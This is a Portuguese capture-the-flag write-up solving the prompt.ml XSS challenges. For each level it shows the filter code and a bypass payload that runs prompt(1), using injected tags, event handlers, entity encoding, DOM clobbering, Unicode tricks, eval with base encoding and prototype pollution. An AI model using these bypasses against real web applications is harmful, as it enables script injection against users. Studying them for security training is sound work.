# Prompt.ml

###### Solved by @Cubano2
> This is a CTF about 

## About the Challenge  
Aqui neste write-up se encontra as respostas do site [prompt.ml](https://prompt.ml/0)  

Nesse site tem desafios de XSS que ensinam sobre a gente sobre os tipos de vulnerabilidade em aplicação web e em navegadores.
O navegador usado neste write-up foi o Microsof Edge e o Firefox

## level 0
```Js
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}        
```
O level 0 é bem tranquilo, com uma simples HTML injection consguimos passar dele.
level 0 ```"><script>prompt(1)</script>```

## level 1
```javascript
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}        
```
level 1 ```<img src=1 onerror='prompt(1)'```

O level 1 coloca um nível de dificuldade a mais fazendo a gente burlar um regex que tem no código. A regex `/<\/?[^>]+>/gi` procura por `<…>` ou `</…>` e remove tudo entre os colchetes. Nisso ela espera um `>` no final. Contornando isso conseguimos passar.

## level 2
```javascript
 Text Viewer
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}        
```
level 2 ```<svg><script>prompt&#40;1)</script>```

Para contornar o filtro que remove `=` e `()`, usamos a entidade HTML ```&#40;``` no lugar do parêntese e evitamos o sinal de igual.

## level 3
```javascript
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}            
```
Level 3 ```--!><svg/onload=prompt(1)```

Para contornar o filtro (que remove ->), usamos o fechamento alternativo de comentário --!> definido no HTML5, fechamos o comentário e em seguida executamos o vetor SVG.


## level 5
```javascript
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}                   
```
Level 5 ```"type=image src onerror
="prompt(1) ```


Neste nivel para contornar o filtro (que remove `>`, qualquer `on…=` e a palavra `focus`), exploramos o fato de que quebras de linha também separam atributos. Assim, escapamos do atributo atual e injetamos um handler


## level 6
```javascript
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}                         
```
Level 6  ```javascript:prompt(1)#{"action":1}```

Para burlar o filtro que bloqueia javascript:, vbscript: e URIs data:, exploramos o DOM clobbering criando um `<input name="action">` via JSON após o #, de modo que `document.forms[0].action` passa no teste e dispara nosso payload.

## level 7
```javascript
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}       
```
Level 7 `"><svg/a=#"onload='/*#*/prompt(1)'`

Neste nível, o filtro faz três coisas: 1) divide a entrada em segmentos separados por #; 2) limita cada segmento a 12 caracteres; 3) envolve cada segmento num <p class="comment" title="…"></p>.
Para burlar isso, no primeiro segmento usamos "> para fechar o atributo title e a tag <p>, em seguida abrimos nosso próprio <svg> e iniciamos um atributo “junk” (a=).
No segundo segmento, fechamos o atributo junk ("), abrimos o evento onload= e usamos /* para encapsular o conteúdo indesejado que virá antes de alcançar o terceiro segmento.
No terceiro segmento, fechamos o comentário JS (*/) e finalmente chamamos prompt(1), completando o payload.


## level 8
```javascript
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
<script>                                    \n\
    // console.log("' + input + '");        \n\
</script> ';
}        
```
Level 8 ` prompt(1) -->`

Neste nível, o payload faz duas coisas principais: 1) insere um espaço antes do prompt para evitar problemas de concatenação; 2) encerra o comentário JS com -->. Isso é feito porque a sequência --> é interpretada como o fim de um comentário no código JavaScript, mesmo em navegadores que são permissivos em relação a isso, permitindo que o restante do código seja executado sem interferências.



## level 9
```javascript
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}       
```
Level 9 `<ſcript/src=http://localhost:8000/test.js></ſcript>`

Neste nível, podemos observar que a entrada do usuário é tratada por “_” e também é feita a conversão de minúsculas para maiúsculas. Para contornar isso, podemos criar um payload utilizando alguns caracteres UNICODE da internet e, além disso, precisamos criar um arquivo JavaScript contendo o texto `prompt(1)`. Com isso só colocar no site a resposta desse level que conseguimos passar de nível.

![image](https://github.com/user-attachments/assets/dc13ddf5-82c6-4c8a-87fe-e57a00362141)

## level A
```javascript
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}
```
Level A `p'rompt(1)`

O nível A (10) é um dos mais fáceis de resolver neste desafio. Existem duas expressões regulares a serem contornadas: a primeira remove todas as ocorrências da palavra-chave `prompt`, enquanto a segunda remove todas as aspas simples `'`. Para contornar a primeira expressão regular, basta usar uma aspa simples para dividir a palavra-chave `prompt` em `pr'ompt`, o que claramente não é uma instrução JavaScript válida. Mas não se preocupe, a segunda expressão regular removerá o caractere invasor `'`, retornando um vetor de ataque válido!

## level B
```javascript
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}
```
Level B `"(prompt(1))in"`

O nível B (11) nos permite injetar diretamente no que será o corpo de um elemento `script`. No entanto, antes de fazer isso, a string que podemos influenciar passa por um filtro rigoroso e não podemos injetar operadores ou outros elementos da linguagem que permitam uma fácil concatenação e injeção de payload. A solução aqui é usar um operador alfanumérico - ou seja, um operador que não nos obrigue a usar os caracteres especiais proibidos. Bem, existem vários desses e um que podemos é o operador `in`.


## level C
```javascript
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}        
```
level C `eval(0x258da033.toString(30))(1)`

O nível C (12) tem um novo nível de dificuldade por conta do `encodeURIComponent` pois essa função faz com que caracteres como `/ ?` e outros que sejam condificados com URL e impossibilitando usarmos payloads que usamos nos níveis anteriores.Porém um jeito de contornar isso é simplesmente escrever o payload em outra base, como por exemplo hexadecimal. Por conta disso temos que usar `0x258da033.toString` onde `0x258da033` passado pra string fica `prompt` e assim burlando o filtro do level, fazendo a função `eval` chamar prompt por meio da base em hexadecimal e no final adicionar o `(1)`.

## level D
```javascript
 function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}
```
level D ```{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}```
 
Nesse nível devemos enviar um JSON com um source propositalmente inválido e um outro dentro de `__proto__`. O filtro remove o source inválido, sobrando só o do protótipo. Usa o poder de herança pra “injetar” código onde antes só era permitido texto simples. Finalmente, engana o .replace(/"/g,'') usando o $`` do replace, montando um onerror` sem precisar de aspas.




## level F
```javascript
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}
```
level F

Neste nivel temos que dividir o payload em pedaços separados por #, cada pedaço vira um <p> com atributo title. O primeiro pedaço (">) fecha o <p>, liberando o resto do texto para inserir tags de verdade. Os comentários HTML dentro de <svg> e <script> servem para “esconder” os atributos gerados automaticamente, garantindo que apenas o prompt(1) seja executado.
